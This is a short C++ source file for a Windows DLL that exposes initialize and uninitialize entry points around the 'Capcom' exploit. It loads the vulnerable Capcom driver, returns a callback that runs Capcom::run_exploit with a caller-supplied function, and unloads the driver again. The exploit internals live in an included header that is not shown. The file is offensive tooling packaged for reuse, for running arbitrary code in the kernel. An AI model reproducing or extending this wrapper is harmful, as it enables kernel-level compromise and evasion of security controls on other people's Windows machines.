#include "pch.h"
#include <iostream>
#include "capcom.h"

using func_exploit = bool(NTAPI*)(Capcom::func_capcom_user);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) { return TRUE; }

func_exploit NTAPI initialize() {
    if (Capcom::load()) {
        printf("[+] capcom load succeeded\n");
    }
    else {
        printf("[-] capcom load failed\n");
        return nullptr;
    }

    return [](Capcom::func_capcom_user capcom_user) {
        return Capcom::run_exploit(capcom_user);
    };
}

bool NTAPI uninitialize() {
    if (Capcom::unload()) {
        printf("[+] capcom unload succeeded\n");
    }
    else {
        printf("[-] capcom unload failed\n");
        return false;
    }

    return true;
}
